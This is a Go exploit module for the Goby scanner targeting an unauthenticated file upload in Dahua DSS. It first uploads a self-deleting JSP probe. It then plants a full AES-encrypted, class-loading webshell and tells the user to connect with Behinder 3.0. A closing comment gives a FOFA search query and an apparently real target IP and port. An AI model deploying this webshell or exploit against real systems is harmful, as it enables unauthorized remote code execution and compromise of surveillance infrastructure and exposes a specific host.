package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "DSS Unauth File Upload Getshell",
    "Description": "DSS Unauth File Upload Getshell",
    "Product": "DSS",
    "Homepage": "https://www.dahuatech.com/",
    "DisclosureDate": "2021-05-26",
    "Author": "goby牛逼",
    "GobyQuery": "title=\"DSS\"",
    "Level": "3",
    "Impact": "<p>getshell</p>",
    "Recommendation": "<p>updata</p>",
    "References": null,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Shell",
            "type": "select",
            "value": "get_shell"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10223"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/emap/bitmap/bitMap_addLayer.action?jsonstr={%22mapx%22:null,%22mapy%22:null,%22name%22:%22%22,%22path%22:%22%22,%22desc%22:%22%22,%22pId%22:null}"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Data = "\r\n------WebKitFormBoundaryfeqBPf6vTNwBAj49\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"login1.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<% out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer(\"ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=\"))); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>\r\n\r\n------WebKitFormBoundaryfeqBPf6vTNwBAj49\r\nContent-Disposition: form-data; name=\"desc\"\r\n\r\n&#25552;&#20132;\r\n------WebKitFormBoundaryfeqBPf6vTNwBAj49\r\nContent-Disposition: form-data; name=\"layerName\"\r\n\r\ntest\r\n------WebKitFormBoundaryfeqBPf6vTNwBAj49--"
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "multipart/form-data; boundary=----WebKitFormBoundaryfeqBPf6vTNwBAj49")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				r, _ := regexp.Compile("[0-9]+.jsp")
				str2 := r.FindString(resp.Utf8Html)
				uri2 := "/upload/emap/" + str2
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "e165421110ba03099a1c0393373c5b43")
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/emap/bitmap/bitMap_addLayer.action?jsonstr={%22mapx%22:null,%22mapy%22:null,%22name%22:%22%22,%22path%22:%22%22,%22desc%22:%22%22,%22pId%22:null}"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Data = "\r\n------WebKitFormBoundaryfeqBPf6vTNwBAj49\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"login2.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"01fd38eaba033857\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\r\n\r\n------WebKitFormBoundaryfeqBPf6vTNwBAj49\r\nContent-Disposition: form-data; name=\"desc\"\r\n\r\n&#25552;&#20132;\r\n------WebKitFormBoundaryfeqBPf6vTNwBAj49\r\nContent-Disposition: form-data; name=\"layerName\"\r\n\r\ntest\r\n------WebKitFormBoundaryfeqBPf6vTNwBAj49--"
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "multipart/form-data; boundary=----WebKitFormBoundaryfeqBPf6vTNwBAj49")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				r, _ := regexp.Compile("[0-9]+.jsp")
				str2 := r.FindString(resp.Utf8Html)
				uri2 := "/upload/emap/" + str2
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
					webshell := expResult.HostInfo.String() + uri2
					expResult.Output = "webshell url：" + webshell + "\npass:PaSs\nuse Behinder 3.0 to connect"
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}

/*
fofa:title=="DSS"
测试IP：
112.19.137.21

测试端口：
8088
*/
